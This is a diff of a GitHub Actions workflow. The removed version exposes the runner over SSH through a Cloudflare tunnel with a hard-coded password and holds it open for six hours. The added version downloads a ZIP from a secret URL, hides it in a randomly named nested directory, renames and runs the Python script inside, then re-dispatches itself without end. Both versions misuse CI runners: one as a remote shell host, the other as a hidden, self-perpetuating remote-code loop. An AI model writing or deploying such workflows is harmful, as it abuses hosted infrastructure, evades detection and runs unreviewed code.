@@ -1,40 +1,149 @@
-name: SSH via Cloudflare (Auto Format)
-on: workflow_dispatch
+name: Maf
+
+on:
+  workflow_dispatch:
+
+permissions:
+  actions: write
+  contents: read
 
 jobs:
-  ssh-server:
-    runs-on: ubuntu-latest
+  export-and-run:
+    runs-on: ubuntu-22.04
+
     steps:
-      - name: Configure SSH
-        run: |
-          # Set the password
-          echo "runner:Pass1234" | sudo chpasswd
-          # Ensure SSH allows password login
-          sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          sudo systemctl restart ssh
+      - name: Checkout repository
+        uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
 
-      - name: Install Cloudflared
-        run: |
-          wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
-          sudo dpkg -i cloudflared-linux-amd64.deb
+      # ===== PYTHON SETUP =====
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
 
-      - name: Start Tunnel and Format Output
+      # ===== INSTALL DEPENDENCIES =====
+      - name: Install Python dependencies
         run: |
-          # Start tunnel in background
-          nohup cloudflared tunnel --url tcp://localhost:22 > tunnel.log 2>&1 &
+          python -m pip install --upgrade pip
+          pip install selenium webdriver-manager
+
+      # ===== INSTALL CHROME =====
+      - name: Install Google Chrome
+        run: |
+          sudo apt update
+          sudo apt install -y google-chrome-stable
+
+      # ===== RANDOM NAMES + NESTED DIR =====
+      - name: Generate random names and nested directory
+        id: names
+        shell: bash
+        run: |
+          set -euo pipefail
+          ZIP_NAME="$(uuidgen).zip"
+          SCRIPT_PREFIX="$(uuidgen)"
           
-          # Wait for the URL to generate
-          sleep 12
+          DEPTH=$((14 + RANDOM % 7))
+          NESTED_DIR=""
           
-          # Extract the hostname (removes https:// and any trailing slashes)
-          RAW_URL=$(grep -o 'https://[-a-z0-9.]*trycloudflare.com' tunnel.log | head -n 1)
-          CLEAN_HOST=$(echo $RAW_URL | sed 's/https:\/\///')
+          for i in $(seq 1 $DEPTH); do
+            if [ $((RANDOM % 2)) -eq 0 ]; then
+              DIR_NAME=".$(uuidgen | cut -d'-' -f1)"
+            else
+              DIR_NAME="$(uuidgen | cut -d'-' -f1)"
+            fi
+            
+            if [ -z "$NESTED_DIR" ]; then
+              NESTED_DIR="$DIR_NAME"
+            else
+              NESTED_DIR="$NESTED_DIR/$DIR_NAME"
+            fi
+          done
           
-          echo "------------------------------------------------------------"
-          echo "COPY AND PASTE INTO HTTP CUSTOM:"
-          echo "------------------------------------------------------------"
-          echo "$CLEAN_HOST:443@runner:Pass1234"
-          echo "------------------------------------------------------------"
+          echo "ZIP_NAME=$ZIP_NAME" >> "$GITHUB_ENV"
+          echo "SCRIPT_PREFIX=$SCRIPT_PREFIX" >> "$GITHUB_ENV"
+          echo "NESTED_DIR=$NESTED_DIR" >> "$GITHUB_ENV"
           
-      - name: Keep Alive
-        run: sleep 21600 # Keeps the server up for 6 hours
+          mkdir -p "$NESTED_DIR"
+
+      # ===== DOWNLOAD ZIP =====
+      - name: Download ZIP to nested directory
+        shell: bash
+        run: |
+          set -euo pipefail
+          TARGET_PATH="$NESTED_DIR/$ZIP_NAME"
+          curl -fSL -o "$TARGET_PATH" "${{ secrets.VIA }}"
+          test -f "$TARGET_PATH"
+
+      # ===== UNZIP =====
+      - name: Unzip in nested directory and cleanup
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd "$NESTED_DIR"
+          unzip -q "$ZIP_NAME"
+          rm -f "$ZIP_NAME"
+
+      # ===== FIND PYTHON SCRIPT =====
+      - name: Find, rename and prepare Python script
+        shell: bash
+        env:
+          SCRIPT_PREFIX: ${{ env.SCRIPT_PREFIX }}
+        run: |
+          set -euo pipefail
+          cd "$NESTED_DIR"
+          
+          script_path="$(find . -type f -name '*.py' -print -quit || true)"
+          
+          if [ -z "$script_path" ]; then
+            echo "❌ No Python script found"
+            find . -maxdepth 4 -type f -print
+            exit 1
+          fi
+          
+          new_name="${SCRIPT_PREFIX}_$(date +%s)_$RANDOM.py"
+          mv "$script_path" "$new_name"
+          
+          FULL_SCRIPT_PATH="$NESTED_DIR/$new_name"
+          echo "EXEC_SCRIPT=$FULL_SCRIPT_PATH" >> "$GITHUB_ENV"
+
+      # ===== RUN PYTHON SCRIPT =====
+      - name: Run Python script
+        shell: bash
+        env:
+          EXEC_SCRIPT: ${{ env.EXEC_SCRIPT }}
+        run: |
+          set -euo pipefail
+          echo "Running: $EXEC_SCRIPT"
+          python "$EXEC_SCRIPT"
+
+      # ===== TRIGGER NEXT RUN =====
+      - name: Trigger next run (workflow_dispatch)
+        shell: bash
+        env:
+          REPO: ${{ github.repository }}
+          WORKFLOW_FILE: main.yml
+          BRANCH: ${{ github.event.repository.default_branch }}
+          REPO_PAT: ${{ secrets.REPO_PAT }}
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -euo pipefail
+
+          TOKEN="${REPO_PAT:-}"
+          if [ -z "$TOKEN" ]; then
+            TOKEN="${GITHUB_TOKEN:-}"
+          fi
+
+          if [ -z "$TOKEN" ]; then
+            echo "No token available"
+            exit 1
+          fi
+
+          API_URL="https://api.github.com/repos/$REPO/actions/workflows/$WORKFLOW_FILE/dispatches"
+
+          curl -sS -X POST "$API_URL" \
+            -H "Accept: application/vnd.github+json" \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Content-Type: application/json" \
+            -d "{\"ref\":\"$BRANCH\"}"
